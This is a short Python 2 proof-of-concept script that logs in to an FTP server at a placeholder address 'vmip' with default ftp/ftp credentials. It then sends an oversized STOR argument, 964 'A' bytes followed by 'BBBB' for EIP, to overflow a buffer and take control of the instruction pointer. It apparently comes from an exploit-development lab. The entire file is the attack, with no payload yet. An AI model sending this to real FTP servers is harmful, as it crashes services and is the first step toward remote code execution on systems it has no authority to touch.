from socket import *

IP = "vmip"
PORT = "21"
ID = "ftp"
PW = "ftp"
EIP = "B"*4

data = "A"*964 + EIP

s = socket(AF_INET, SOCK_STREAM)
s.connect((IP,int(PORT)))
s.send("USER {}\r\n".format(ID))
s.recv(500)
s.send("PASS {}\r\n".format(PW))
s.recv(500)
       
print "[*]Send exploit...",
s.send("STOR {}\r\n".format(data))
print "Done"
